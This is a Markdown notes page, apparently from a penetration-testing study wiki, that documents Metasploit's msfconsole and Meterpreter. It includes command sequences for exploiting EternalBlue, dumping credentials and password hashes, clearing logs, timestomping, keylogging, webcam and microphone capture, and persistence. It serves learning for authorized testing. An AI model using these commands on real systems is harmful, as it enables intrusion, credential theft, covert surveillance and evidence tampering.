# Metasploit framework

[![metasploitframework](../../../../_badges/htb/metasploitframework.svg)](https://academy.hackthebox.com/course/preview/using-the-metasploit-framework)
[![metasploitintro](../../../../_badges/thm/metasploitintro.svg)](https://tryhackme.com/room/metasploitintro)
[![rpmetasploit](../../../../_badges/thm/rpmetasploit.svg)](https://tryhackme.com/room/rpmetasploit)
[![rpmetasploit](../../../../_badges/thmp/rpmetasploit.svg)](https://tryhackme.com/room/rpmetasploit)
[![metasploitexploitation](../../../../_badges/thmp/metasploitexploitation.svg)](https://tryhackme.com/room/metasploitexploitation)
[![meterpreter](../../../../_badges/thmp/meterpreter.svg)](https://tryhackme.com/room/meterpreter)
[![adventofcyber4](../../../../_badges/thm/adventofcyber4/day9.svg)](https://tryhackme.com/room/adventofcyber4)
[![ccpentesting](../../../../_badges/thm-p/ccpentesting.svg)](https://tryhackme.com/room/ccpentesting)

<div class="row row-cols-lg-2"><div>

The [Metasploit Framework](https://github.com/rapid7/metasploit-framework) is a penetration testing framework that you can use to test a system.

Scripts to exploit vulnerabilities are written in Ruby 💎. There are many scripts already available.

**Learn** 🎓

* [Metasploit Documentation](https://docs.metasploit.com/)
* [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/) 📌
</div><div>

Scripts are divided into **modules** 📌

* **Auxiliary**: test the availability of an exploit
* **Payloads**: the data sent to perform the attack
    * Single/inline/stageless payloads <small>(1 exchange)</small>
    * Staged payloads <small>(2 exchanges)</small>
    * See [msfvenom](/cybersecurity/red-team/tools/frameworks/metasploit/msfvenom.md) for details and payload creation.
* **Exploits**: code exploiting a vulnerability
* Encoders/Evasion/NOPs
* **Post**: scripts that you can use once on the target
</div></div>

<hr class="sep-both">

## msfconsole

[![shells_and_payloads](../../../../_badges/htb/shells_and_payloads.svg)](https://academy.hackthebox.com/course/preview/shells--payloads)

<div class="row row-cols-lg-2"><div>

#### msfconsole — Overview

The `msfconsole` is a component of the metasploit framework used to search and  configure modules to exploit a vulnerability, and eventually, spawn a remote shell, which may be a meterpreter shell.

```shell!
$ msfconsole -q
msf6> help
msf6> help <command>
msf6> help help # example
```

You can see every command you used with `history`.

<br>

#### msfconsole — Search For Modules

The first thing you want to do is to find exploits <small>(to perform an attack)</small> or auxiliaries <small>(to see if the target is vulnerable)</small>.

```shell!
msf6> search apache tomcat            # Multiple terms
msf6> search exploit/linux/local/     # Module Path
msf6> search type:auxiliary wordpress # Could be "exploit"...
msf6> search cve:2022                 # Filter by CVE:year
msf6> search CVE-2017-0144            # Sometimes...
msf6> search eternalblue pool
#  Name  Disclosure Date  Rank     Check  Description
-  ----  ---------------  ----     -----  -----------
0  exploit/windows/smb/ms17_010_eternalblue  [...]
```

⚠️ The first column is the module search index while the second is the module path. You can use either of them to select a module.

<br>

#### msfconsole — Inspect A Module

You can query information about a module using:

```shell!
msf6> info module_name         # ex: exploit/xxx/...
msf6> info module_search_index # ex: 0
```

<br>

#### msfconsole — Select A Module

To select a module, you can search for it and use the index/name, or you can pass something "unique" enough to `use`:

```shell!
msf6> use module_name           # ex: exploit/xxx/...
msf6> use module_index          # ex: 0
msf6> use ms17_010_eternalblue  # unique name
```

You can go back to where you were before selecting a module using: 

```shell!
exploit> back
msf6> # search another module, etc.
```
</div><div>

#### msfconsole — Configure A Module

Each module has options we need to set. You can list them with:

```shell!
exploit> options
exploit> show options # same
```

Some options that you will often see are:

* `LHOST IP`: your IP or network interface 
* `RHOSTS IP`: your target IP
* `RPORT PORT`: your port

To set or unset them, you can use `set` and `unset`:

```shell!
exploit> set RHOSTS target_ip # see also: setg (global)
exploit> unset RHOSTS         # see also: unset all
```

Some modules are more complex to configure. You may have to select a payload, a target, and edit advanced options.

```shell!
exploit> show payloads
exploit> set payload 1 # or use payload_name/path
```
```shell!
exploit> show targets 
exploit> set target 2
```

```shell!
exploit>  show advanced options # same as "advanced"
```
</div></div>

<hr class="sep-both">

<div class="row row-cols-lg-2"><div>

* [Configure an exploit](_files/msf_configuration.md) (`options`, `show`, `set`, `setg`, `unset`)
* [Execute an exploit](_files/msf_exploit.md) (`run`/`exploit`, `check`)

Each remote access is wrapped in a [session](_files/msf_session.md).

You can also configure and execute an exploit in one go:

```shell!
exploit> run opt=value opt2=value [...]
exploit> check opt=value opt2=value [...] 
```
</div><div>
</div></div>

<hr class="sep-both">

## Meterpreter

<div class="row row-cols-lg-2"><div>

#### Meterpreter — Overview

The meterpreter is one of the components of the metasploit framework. It's a reverse shell with common scripts loaded to make [Privilege escalation](/cybersecurity/red-team/s4.privesc/index.md) and [Post-exploitation](/cybersecurity/red-team/s5.post-exploitation/index.md) easier.

It's an  **in-memory** reverse shell using encrypted communications. To upgrade a normal shell <small>(note down the sid when using `background`)</small>, use:

```ps
# upgrade
msf6 exploit('module_used')> sessions -u -1
# kill the non-meterpreter session
msf6 exploit('module_used')> sessions -k old_session_id
# move to the meterpreter session
msf6 exploit('module_used')> sessions -i new_session_id
# done
meterpreter>
```

**Commands that you can use in the meterpreter are different based on the payload that you used.**

Call `help` to see what you can use given the current payload.

```bash!
meterpreter > help # list commands that you can use
```

<br>

#### Meterpreter — Common Commands

You can use many Linux-like commands such as:

```shell!
meterpreter> ls        # List files
meterpreter> cd        # Move to some folder
meterpreter> pwd       # Path to current folder
meterpreter> cat file  # Show the contents of a file
meterpreter> edit file # Open a file in VIM
meterpreter> ps        # List running processes
meterpreter> ipconfig  # Show network information
meterpreter> execute -f xxx.exe -a "args here" # Run a program
meterpreter> exit      # Kill the meterpreter
```

These are new convenient functions that were added:

```shell!
meterpreter> search -f pattern   # Search files by pattern
meterpreter> search -f pattern / # Search [...] inside /
meterpreter> download remote_path local_path # Download
meterpreter> upload local_path remote_path   # Upload
meterpreter> resolve hostname    # Get the IP from hostname
meterpreter> idletime        # time the host was idle
meterpreter> localtime       # time and date
meterpreter> getenv PATH     # get PATH
meterpreter> checksum <file> # get file checksum
meterpreter> resource commands.txt # Load commands from a file
```

You can run commands on your machine in the meterpreter:

```shell!
meterpreter> lpwd      # Show the current local folder
meterpreter> lcd path  # Move to another local folder
meterpreter> lls path  # List local files
meterpreter> lcat file # Show the contents of a local file
```
</div><div>

#### Meterpreter — Pop a shell

You can also pop a shell if you want to:

```shell!
meterpreter> shell # "sh" on Linux, "cmd" on Windows
```

```shell!
meterpreter> load powershell
meterpreter> powershell_shell
```

<br>

#### Meterpreter — Migrate

To run some utilities or exploits on Windows, we often need to move to a stable privileged owned by "NT AUTHORITY\SYSTEM."

```shell!
meterpreter> ps # list process
meterpreter> migrate process_pid # move to another process
meterpreter> migrate -N process_name # same
meterpreter> migrate -N spoolsv.exe # can restart so good
meterpreter> migrate -N explorer.exe # screenshots...
```

<br>

#### Meterpreter — Enumeration

Find which user you compromised and which Operating System/Architecture is the target running <small>(tune your exploits or CVEs)</small>.

```shell!
meterpreter> getuid
Windows: NT AUTHORITY\SYSTEM
meterpreter> sysinfo
Computer        : XXX-PC
OS              : Windows X (... Build xxx...).
Architecture    : x64
```

You can list [your privileges](/cybersecurity/red-team/s4.privesc/windows/topics/privs.md).

```shell!
meterpreter> getprivs
```

You can look for exploits but you often need to migrate first.

```shell!
meterpreter> run post/multi/recon/local_exploit_suggester
```

<br>

#### Meterpreter — Windows Exploitation

You can automatically try to exploit [your privileges](/cybersecurity/red-team/s4.privesc/windows/topics/privs.md).

```shell!
meterpreter> getsystem -h # List exploits
meterpreter> # steal_token <pid>???
```

We often want to load and use [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md):

```shell!
meterpreter> load kiwi
meterpreter> migrate some_process_nt_system_compatible
meterpreter> creds_all    # retrieve all credentials
meterpreter> lsa_dump_sam     # Admin  | Dump hashes from SAM
meterpreter> lsa_dump_secrets # Admin? | Dump LSA secrets
```
</div></div>

<hr class="sep-both">

## Metasploit Post-Exploitation

*All modules below should require administrative permissions...*

<div class="row row-cols-lg-2"><div>

#### Meterpreter — Complicate Forensics

You may be able to use these:

```shell!
meterpreter> clearev   # clear event logs
meterpreter> clearav   # clear AV logs
meterpreter> timestomp # mess with timestamps
```

#### Meterpreter — Pivoting

Refer to [this](/cybersecurity/red-team/s5.post-exploitation/index.md#pivoting-to-another-host-) for tunneling/port forwarding.

```shell!
meterpreter> run post/windows/gather/checkvm
```

#### Meterpreter — Take control of the webcam

```shell!
meterpreter> webcam_list
meterpreter> webcam_snap
```

#### Meterpreter — Take a screenshot

You may also use `screenshot` 📌.

```shell!
meterpreter> migrate -N explorer.exe
meterpreter> use espia
meterpreter> screengrab
```

#### Meterpreter — Install a keylogger

```shell!
meterpreter> migrate -N explorer.exe
meterpreter> keyscan_start # start
meterpreter> keyscan_dump # dump keys
```
</div><div>

#### Meterpreter — Watch the screen in real time

Watch the remote user desktop in real time

```shell!
meterpreter> screenshare
meterpreter> record_mic # Record audio from the default microphone for X seconds
```

#### Meterpreter — Record microphone

Record audio from the default microphone for X seconds

```shell!
meterpreter> record_mic
```

#### Meterpreter — Enable Remote Desktop Protocol

```shell!
meterpreter> run post/windows/manage/enable_rdp
```

#### Meterpreter — Persistence

See [METERPRETER SERVICE](https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/).

```shell!
meterpreter> # Automatically start the agent when the system boots
meterpreter> run persistence -X
```

#### Meterpreter — Dump Hashes

```shell!
meterpreter> hashdump
meterpreter> run post/linux/gather/hashdump # cat /etc/shadow?
```
</div></div>

<hr class="sep-both">

## Uncommon usages

<div class="row row-cols-lg-2"><div>

#### Metasploit database

```shell!
$ sudo systemctl start postgresql
$ sudo msfdb init
$ msfconsole -q
msf6> db_status
[*] Connected to msf. Connection type: postgresql.
```

You can export results using: `db_export -f xml db.xml`.

<br>

#### workspaces

To keep things clean and tidy, it's better to create a workspace, so that results from other scans don't get mixed up.

```shell!
msf6> workspace # list workspaces
msf6> workspace -a xxx # create xxx
msf6> workspace xxx # move to xxx
msf6> workspace -d xxx # delete xxx
```

<br>

#### port scanner

The command `db_nmap` is the same as `nmap`. You will have to first set up [metasploit database](#metasploit-database).

```shell!
msf6> db_nmap -sV -p- -A IP
msf6> db_import nmap_result.xml # or, load scan result
```

<br>

#### banner grabbing

```shell!
msf6> use auxiliary/scanner/http/http_version # HTTP
```
</div><div>

#### SQL utility

```shell!
msf6> use auxiliary/scanner/mysql/mysql_schemadump # dump cols+tables
msf6> use auxiliary/scanner/mysql/mysql_hashdump # dump dump users+hash
msf6> use mysql_sql # send SQL queries
msf6> use auxiliary/scanner/postgres/postgres_schemadump # ...
msf6> use auxiliary/admin/postgres/postgres_sql # ...
```

<br>

#### nessus

The msfconsole can be used along [Nessus](/cybersecurity/red-team/tools/scanners/vulns/nessus.md). See [this tutorial](https://scubarda.com/2015/11/16/launching-nessus-scans-inside-metasploit/) and [these tips](https://www.offensive-security.com/metasploit-unleashed/working-with-nessus/). Note that you need to start [metasploit database](#metasploit-database) first.

```shell!
msf6> load nessus
msf6> nessus_help # list commands
msf6> # Connect
msf6> nessus_connect user:pass@localhost:8834
msf6> # List the scans that you did
msf6> nessus_scan_list
msf6> # Import the result of a scan
msf6> nessus_db_import id_you_found_in_the_list
```

#### Useful commands

Once you stored something in the database (nmap/nessus/...), you can use these commands to operate on the saved data.

```shell!
msf6> help hosts
msf6> help services
msf6> help vulns
msf6> help creds
msf6> help loot
```
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* Commands:
  * Jobs are cancellable processes (`kill`): `run -j` (in bg), `jobs`, `jobs -i 0`
  * `exploit -k -z`
* `get xxx`, `spool`, `arch`,
* `search type:exploit platform:windows target:xp smb`
* `multi/ssh/sshexec`
</div><div>

* [Web delivery](https://www.offsec.com/metasploit-unleashed/web-delivery/)
* [MSF Guide](https://gitlab.com/goron/security_whitepapers/-/blob/f2e1a7a522240ad3cd9e238237342b328b1fd162/the-easiest-metasploit-guide-youll-ever-read.pdf)
* [Multiple Ways to Bypass UAC using Metasploit](https://www.hackingarticles.in/multiple-ways-to-bypass-uac-using-metasploit/)

You can prepend any command using `grep` to filter lines. You can chain them too. `grep x grep y <command>`.

* Plugins: `/usr/share/metasploit-framework/plugins`
* `use /path/to/xxx.rb` (tested: relative to exploit)
</div></div>